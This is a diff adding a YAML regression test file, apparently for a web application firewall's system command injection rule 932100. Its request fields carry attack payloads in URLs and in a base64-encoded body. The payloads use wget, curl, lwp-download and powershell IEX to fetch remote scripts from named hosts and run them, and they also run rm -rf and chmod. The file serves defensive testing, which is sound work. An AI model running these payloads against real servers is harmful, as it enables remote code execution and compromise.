@@ -1,0 +1,68 @@
+---
+  meta:
+    author: csanders-git
+    description: None
+    enabled: true
+    name: 932100.yaml
+  tests:
+  -
+    test_title: 932100-1
+    desc: System Command Injection (932100) from old modsec regressions
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+            Accept-Encoding: gzip,deflate
+            Accept-Language: en-us,en;q=0.5
+            Host: localhost
+            Keep-Alive: '300'
+            Proxy-Connection: keep-alive
+            User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv
+          method: GET
+          port: 80
+          uri: /?foo=system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf
+          version: HTTP/1.0
+        output:
+          log_contains: id "932100"
+  -
+    test_title: 932100-2
+    desc: System Command Injection (932100) from old modsec regressions
+    stages:
+    -
+      stage:
+        input:
+          dest_addr: 127.0.0.1
+          headers:
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+            Accept-Encoding: gzip,deflate
+            Accept-Language: en-us,en;q=0.5
+            Host: localhost
+            Keep-Alive: '300'
+            Proxy-Connection: keep-alive
+            User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv
+          method: GET
+          port: 80
+          uri: /?foo=http://ricky.ilmerlodellarocca.com/upload.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/appa.jpg;%20appa.jpg;perl%20appa.jpg;rm%20-rf%20appa.jpg;wget%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;curl%20-O%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;lwp-download%20http://shinnongclinic.com/kor_board/icon/member_image_box/1/ca.txt%20ca.php;mv%20ca.php%20ca.php;chmod%20755%20ca.php
+          version: HTTP/1.0
+        output:
+          log_contains: id "932100"
+  -
+    # Currently this will be blocked by apache before it gets
+    # to CRS. as a result we need to check for 400 from Apache
+    # We ideally want a OR output check.
+    # https://github.com/CRS-support/ftw/issues/19
+    test_title: 932100-3
+    desc: CSV Injection Test as described in http://www.client9.com/article/five-interesting-injection-attacks/
+    stages:
+    -
+      stage:
+        input:
+          encoded_request: "UE9TVCAvaW5kZXguaHRtbCBIVFRQLzEuMQpIb3N0OiAxOTIuMTY4LjEuMjMKVXNlci1BZ2VudDogY3VybC83LjQzLjAKQWNjZXB0OiAqLyoKQ29udGVudC1MZW5ndGg6IDY0CkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkCkNvbm5lY3Rpb246IGNsb3NlCgpkPTE7MjszOzQ7NVxuMTtAU1VNKDErMSkqY21kfCcgcG93ZXJzaGVsbCBJRVgod2dldCAwci5wZS9wKSdcIUEwOzM="
+        output:
+            status: [403, 400]
+            #log_contains: id "932100"
